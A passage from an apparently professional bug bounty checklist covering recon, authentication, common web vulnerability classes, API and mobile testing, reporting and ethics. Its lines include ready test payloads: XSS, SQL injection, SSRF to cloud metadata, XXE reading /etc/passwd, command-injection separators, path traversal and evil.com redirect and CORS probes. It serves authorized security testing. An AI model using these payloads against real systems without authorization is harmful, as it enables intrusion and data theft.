- [ ] Reviewed the company's job postings (reveal tech stack, internal tools)
- [ ] Checked LinkedIn for engineering team (reveals tech stack from profiles)

**Active Reconnaissance**

- [ ] Ran httpx against all subdomains — identified live hosts with status codes and titles
- [ ] Ran gowitness or eyewitness to screenshot all live hosts
- [ ] Reviewed screenshots for admin panels, dev environments, login pages, error pages
- [ ] Ran naabu or nmap against interesting subdomains (check for non-standard ports)
- [ ] Checked common paths on all subdomains: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/api/docs`, `/swagger`
- [ ] Identified the technology stack (Wappalyzer, Burp headers, response signatures)
- [ ] Identified the web framework, server software, and versions

**Subdomain Takeover Check**

- [ ] Ran subjack or nuclei takeover templates against all subdomains
- [ ] Manually verified any flagged subdomains by checking the fingerprint error page
- [ ] Checked CNAME records for dangling external references

**JavaScript Analysis**

- [ ] Collected all JavaScript file URLs using gau or Burp history
- [ ] Downloaded and searched JS files for: `api_key`, `secret`, `token`, `password`, `apiUrl`, `internalUrl`
- [ ] Ran LinkFinder or SecretFinder against JS files
- [ ] Checked for source maps (`.js.map` files)
- [ ] Noted all API endpoints discovered in JavaScript

---

## Section 3: Authentication & Session Testing

**Login / Registration**

- [ ] Tested for username enumeration (different error messages for valid vs invalid usernames)
- [ ] Tested for account lockout: how many failed attempts before lockout? Is there a lockout at all?
- [ ] Tested for weak password policy: accepted `password`, `123456`, single characters
- [ ] Tested HTTP vs HTTPS: does the login form submit over HTTP on any path?
- [ ] Tested for SQL injection in login fields: `' OR '1'='1` in username/password
- [ ] Tested for default credentials on any admin panels found in recon
- [ ] Tested password reset flow completely (see Broken Authentication section below)

**Session Management**

- [ ] Examined session token/cookie: is it random? Is it predictable?
- [ ] Tested session fixation: set a session token before login, check if the same token is used after login
- [ ] Verified `Secure` flag on session cookies (not transmitted over HTTP)
- [ ] Verified `HttpOnly` flag on session cookies (not accessible via JavaScript)
- [ ] Verified `SameSite` attribute (`Strict` or `Lax` — not `None` without `__Host-` prefix)
- [ ] Tested whether old session tokens are invalidated after logout
- [ ] Tested concurrent sessions: can the same account be logged in from two places?
- [ ] Tested session timeout: how long does an idle session stay valid?

**Multi-Factor Authentication**

- [ ] Tested if MFA can be bypassed by directly accessing post-login URLs without completing MFA
- [ ] Tested if MFA codes can be brute-forced (no rate limiting on OTP submission)
- [ ] Tested if MFA codes have an expiration (using a 10-minute-old code)
- [ ] Tested if MFA enrollment can be bypassed or manipulated via API

**Password Reset**

- [ ] Requested password reset for a non-existent email — does it confirm or deny the email exists?
- [ ] Tested reset token expiration: do tokens expire after use? After time?
- [ ] Tested reset token predictability: are tokens guessable or sequential?
- [ ] Tested reset link for host header injection: modified `Host:` header to redirect reset link to attacker domain
- [ ] Tested if reset tokens can be reused after a successful reset

---

## Section 4: Every Major Vulnerability Class

### 4.1 Cross-Site Scripting (XSS)

- [ ] Identified all input fields where user data appears reflected in the response
- [ ] Tested reflected XSS: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
- [ ] Identified all input fields that store data shown to other users (comments, names, bios, usernames)
- [ ] Tested stored XSS in all persistent input fields
- [ ] Checked DOM-based XSS: searched JS for `document.write`, `innerHTML`, `location.hash`, `location.search` used without sanitization
- [ ] Tested XSS in HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For` (if reflected in admin panels or error pages)
- [ ] Tested XSS filter bypass if basic payloads are blocked: encoding, case variation, event handler variations
- [ ] Confirmed impact: cookie theft, session hijacking, or CSRF-via-XSS demonstrated

### 4.2 SQL Injection

- [ ] Added `'` to every parameter — checked for SQL errors in the response
- [ ] Tested numeric parameters: `1 AND 1=1` vs `1 AND 1=2` (boolean-based)
- [ ] Tested time-based blind: `' AND SLEEP(5)--` (MySQL), `' AND pg_sleep(5)--` (PostgreSQL)
- [ ] Used sqlmap on confirmed injection points: `sqlmap -u "URL" -p "param" --dbs`
- [ ] Tested search fields, sort parameters, and filter parameters (often forgotten)
- [ ] Tested second-order SQL injection (data stored safely but used unsafely later)

### 4.3 Broken Access Control / IDOR

- [ ] Tested every API endpoint that references a resource ID with Account B's IDs using Account A's token
- [ ] Tested HTTP verb changes on every endpoint: GET → PUT, POST, DELETE
- [ ] Tested parameter pollution: add a duplicate parameter with a different user's ID
- [ ] Checked API version downgrade: v2 endpoint secured? Try the v1 equivalent
- [ ] Tested all administrative functions while authenticated as a regular user
- [ ] Tested horizontal privilege escalation (user A accessing user B's data)
- [ ] Tested vertical privilege escalation (regular user accessing admin functionality)
- [ ] Checked mass assignment: added extra fields (`role`, `isAdmin`) to PUT/PATCH requests

### 4.4 SSRF

- [ ] Identified all features that fetch external URLs (webhooks, import from URL, link preview, PDF generators, image fetch)
- [ ] Tested with `http://127.0.0.1:80/` — does the server return its own content?
- [ ] Tested with `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- [ ] Tested with Burp Collaborator URL — confirmed out-of-band SSRF via DNS
- [ ] Tested SSRF filter bypass: `http://2130706433/` (decimal IP for 127.0.0.1), `http://localhost/`, `http://[::1]/`
- [ ] Tested for internal network access via SSRF (common internal IPs: 10.0.0.1, 192.168.1.1)

### 4.5 CSRF

- [ ] Identified all state-changing actions performed by authenticated users
- [ ] Checked each request for CSRF token — is one present?
- [ ] If CSRF token present: tested with a missing token, an invalid token, a blank token
- [ ] Tested if the `SameSite` cookie attribute prevents CSRF (Lax or Strict)
- [ ] Built a CSRF PoC HTML form for any unprotected state-changing endpoint
- [ ] Tested for JSON CSRF: can the Content-Type be changed to `text/plain` while keeping JSON body?

### 4.6 File Upload

- [ ] Tested uploading a file with an executable extension: `.php`, `.jsp`, `.aspx`, `.py`
- [ ] Tested double extension bypass: `shell.php.jpg`, `shell.php%00.jpg`
- [ ] Tested MIME type confusion: upload a PHP file with `Content-Type: image/jpeg`
- [ ] Tested if uploaded files are stored in a web-accessible directory and executed
- [ ] Tested SVG upload for stored XSS (SVGs can contain JavaScript)
- [ ] Tested PDF/Office uploads for XXE if the application parses them
- [ ] Confirmed whether the upload directory has execution disabled

### 4.7 Business Logic

- [ ] Mapped all multi-step processes (checkout, registration, password reset) and tested each step in isolation and out of order
- [ ] Tested negative values in quantity and price fields
- [ ] Tested applying discount codes multiple times (race condition)
- [ ] Tested purchasing items at $0.00 or negative prices
- [ ] Tested whether skipping steps in a workflow causes unintended behavior
- [ ] Tested role-based restrictions: can a free user access premium features by navigating directly?
- [ ] Tested for parameter tampering in prices, quantities, and discount amounts

### 4.8 XXE (XML External Entity)

- [ ] Identified all endpoints that accept XML input or parse XML (file upload, API requests, SOAP endpoints)
- [ ] Tested basic XXE: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- [ ] Tested blind XXE with Burp Collaborator (OOB DNS exfiltration)
- [ ] Tested XXE in Office documents (DOCX, XLSX), SVG files, and PDF parsers
- [ ] Tested SSRF via XXE: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`

### 4.9 Command Injection

- [ ] Identified features that imply OS operations: ping, DNS lookup, file conversion, network tools
- [ ] Tested basic separators: `;id`, `&&id`, `|id`, `` `id` ``, `$(id)`
- [ ] Tested time-based blind: `; sleep 10`
- [ ] Confirmed blind injection via Burp Collaborator: `; nslookup COLLAB_DOMAIN`
- [ ] Used safe commands only: `id`, `whoami`, `hostname`, `sleep`

### 4.10 Path Traversal

- [ ] Identified all endpoints that accept file paths or names as parameters
- [ ] Tested: `../../../etc/passwd`, `....//....//....//etc/passwd`
- [ ] Tested URL encoding: `%2e%2e%2f`, `%2e%2e/`, `..%2f`
- [ ] Tested double encoding: `%252e%252e%252f`
- [ ] Tested Windows paths: `..\..\windows\win.ini`
- [ ] Confirmed impact with a safe file: `/etc/hostname`, `/proc/version`

### 4.11 Open Redirect

- [ ] Identified all parameters that control redirect destination: `next=`, `url=`, `redirect=`, `return=`, `dest=`
- [ ] Tested direct value substitution: `?next=https://evil.com`
- [ ] Tested bypass with `//evil.com`, `///evil.com`, `https:///evil.com`
- [ ] Tested for JavaScript pseudo-protocol: `?next=javascript:alert(1)` (XSS via open redirect)
- [ ] Assessed impact: is this usable as a phishing vector or for OAuth code theft?

### 4.12 CORS Misconfiguration

- [ ] Added `Origin: https://evil.com` to all authenticated API requests
- [ ] Checked response for `Access-Control-Allow-Origin: https://evil.com` (reflected)
- [ ] Checked if `Access-Control-Allow-Credentials: true` is present
- [ ] Tested: `Origin: null`, `Origin: https://target.com.evil.com`, `Origin: https://evil-target.com`
- [ ] If vulnerable: built HTML PoC demonstrating actual cross-origin data theft

### 4.13 SSTI (Server-Side Template Injection)

- [ ] Tested all reflected input fields with: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- [ ] Checked for output of `49` — confirmed which template engine (Jinja2 vs Twig vs FreeMarker)
- [ ] If confirmed: ran tplmap for automated exploitation
- [ ] Attempted RCE with safe commands: `id`, `whoami`, `hostname`

### 4.14 JWT Attacks

- [ ] Decoded any JWT tokens found in cookies or Authorization headers
- [ ] Tested `alg:none` attack (and case variations)
- [ ] Checked for public key endpoint (`/jwks.json`, `/.well-known/jwks.json`)
- [ ] If RS256: attempted algorithm confusion using the public key
- [ ] Checked `kid` header for SQL injection and path traversal
- [ ] Attempted HS256 secret brute force with hashcat if symmetric algorithm used
- [ ] Used jwt_tool for automated comprehensive tests

### 4.15 OAuth Vulnerabilities

- [ ] Mapped the complete OAuth flow in Burp
- [ ] Tested `state` parameter: removed it, changed it, reused it
- [ ] Tested redirect_uri manipulation: attacker domain, subdomain variations, path traversal
- [ ] Tested scope escalation: requested broader permissions
- [ ] Checked for account linking takeover via email matching

### 4.16 Additional Classes

- [ ] Checked cookies and POST bodies for Java serialized objects (`rO0A`) or PHP serialized data (`O:`)
- [ ] Ran HTTP Request Smuggler (Burp extension) against the root endpoint
- [ ] Identified features with single-use or rate-limited behavior for race condition testing
- [ ] Sent 20 parallel requests to single-use endpoints using Burp's "Send group in parallel"

---

## Section 5: API-Specific Checks

- [ ] Located API documentation: `/api/docs`, `/swagger`, `/openapi.json`, `/graphql`
- [ ] Imported Swagger/OpenAPI spec into Burp for automatic endpoint coverage
- [ ] Tested every API endpoint for unauthenticated access
- [ ] Tested every API endpoint with an expired or invalid JWT/token
- [ ] Tested IDOR on every endpoint referencing a resource by ID
- [ ] Tested HTTP verb manipulation on every endpoint (GET → PUT/DELETE/PATCH)
- [ ] Tested mass assignment: submitted extra fields in PUT/PATCH/POST requests
- [ ] Tested rate limiting on authentication endpoints (login, OTP, password reset, token refresh)
- [ ] If GraphQL: ran full introspection query and reviewed all types/mutations/queries
- [ ] If GraphQL: tested batching attack for rate limit bypass
- [ ] If GraphQL: tested IDOR in all queries and mutations
- [ ] Checked for API versioning: tested deprecated v1 endpoints for missing controls

---

## Section 6: Mobile-Specific Checks (If App Is In Scope)

- [ ] Downloaded APK from the Play Store (or IPA if iOS)
- [ ] Ran MobSF static analysis — reviewed hardcoded secrets and exported components
- [ ] Decompiled with jadx — searched for API keys, credentials, backend URLs
- [ ] Examined `AndroidManifest.xml` for exported activities, services, and receivers
- [ ] Tested exported activities for authentication bypass via adb
- [ ] Checked insecure data storage: SharedPreferences, SQLite, external storage
- [ ] Set up Burp proxy for mobile traffic interception
- [ ] Bypassed SSL pinning with Objection or Frida if necessary
- [ ] Tested all mobile API calls using the same methodology as Sections 4 and 5
- [ ] Monitored logcat for sensitive data appearing in logs
- [ ] Tested deeplinks for open redirect, XSS, or unauthorized access

---

## Section 7: Before You Submit a Report

**Verification**

- [ ] Reproduced the vulnerability from scratch (clean browser session, fresh Burp history)
- [ ] Confirmed the vulnerability exists on the production/in-scope target
- [ ] Confirmed the vulnerable endpoint/parameter is definitively in scope
- [ ] Can demonstrate the complete exploit path from start to finish consistently

**Impact Assessment**

- [ ] Clearly identified what a real attacker could do with this vulnerability
- [ ] Identified what data could be accessed, modified, or deleted
- [ ] Identified who is affected (all users? admins only? specific users?)
- [ ] Calculated CVSS v3 score and have the vector string ready
- [ ] Compared to similar public write-ups to calibrate expected severity

**Report Quality**

- [ ] Report title is specific and accurate (not "I found an XSS" — say "Stored XSS in `/profile/bio` field allows session hijacking of any user who views the profile")
- [ ] Written steps to reproduce are clear enough that someone else can follow them exactly
- [ ] Every step includes the exact HTTP request (from Burp) or command executed
- [ ] Screenshots included for each critical step
- [ ] A proof-of-concept payload is included and demonstrated in a screenshot
- [ ] Impact section explains real-world consequences in plain language
- [ ] Remediation recommendation is included (how should it be fixed?)
- [ ] CVSS score and vector string included
- [ ] Report is free of spelling errors and unclear language

**Ethics Check**

- [ ] Did not access more data than necessary to prove the vulnerability
- [ ] Did not exfiltrate real user data (stopped at confirming access, not downloading data)
- [ ] Did not modify or delete any production data
- [ ] Did not use findings from one target to access another (scope creep)
- [ ] Prepared to immediately stop if notified of a scope issue

---

## Section 8: After Submission

**Immediate**

- [ ] Noted the report ID and submission timestamp
- [ ] Set a calendar reminder for the program's stated SLA date
- [ ] Stopped testing the specific vulnerability (avoid re-reporting the same issue)
- [ ] Continued testing other areas of the target while waiting

**Follow-Up**

- [ ] If no acknowledgment within SLA: sent one polite follow-up message
- [ ] If no response after second follow-up: used platform's escalation option (last resort)
- [ ] If triaged: provided any additional information requested promptly (within 24 hours ideally)
- [ ] If marked duplicate: asked when the original was submitted (for learning purposes)
- [ ] If severity downgraded: responded with a professional, evidence-based counter-argument (not an emotional reaction)

**Post-Resolution**

- [ ] After fix confirmed: tested the fix to verify it is complete and correct
- [ ] After fix confirmed and waiting period: requested disclosure permission
- [ ] After disclosure approved: wrote a public write-up explaining the vulnerability and methodology
- [ ] Shared write-up with the community (Twitter/X, blog, Hacktivity)
- [ ] Added the finding to your personal notes/portfolio
- [ ] Recorded income in your tracking spreadsheet

---

## Summary

This master checklist is your engagement companion. It covers all eight phases of a bug bounty engagement: pre-testing setup and scope review, full reconnaissance, authentication testing, all major vulnerability classes, API-specific testing, mobile testing (when applicable), report quality verification, and post-submission follow-through.

No checklist replaces creative thinking — vulnerabilities are found by curious minds, not by checklists alone. But systematic coverage ensures you do not leave easy findings on the table through oversight. Return to this checklist after every engagement to identify the sections you skipped and the techniques you have not yet tried.

## Final Checklist for the Checklist

- [ ] Have printed or saved a personal copy of this checklist for offline use
- [ ] Have adapted the checklist to remove sections not relevant to your primary target type
- [ ] Have added notes for techniques specific to the target's technology stack
- [ ] Use this checklist on every engagement — consistency builds excellence

> _"The hunter who does not check the checklist finds the bug that sends them back to check the checklist."_ — Field Wisdom

> _"Security testing is 10% inspiration and 90% methodical, unglamorous checking of the things everyone else skips."_ — Anonymous Bug Hunter

---

_Remember: test only what you are authorized to test. Stay curious. Stay ethical. Stay methodical._
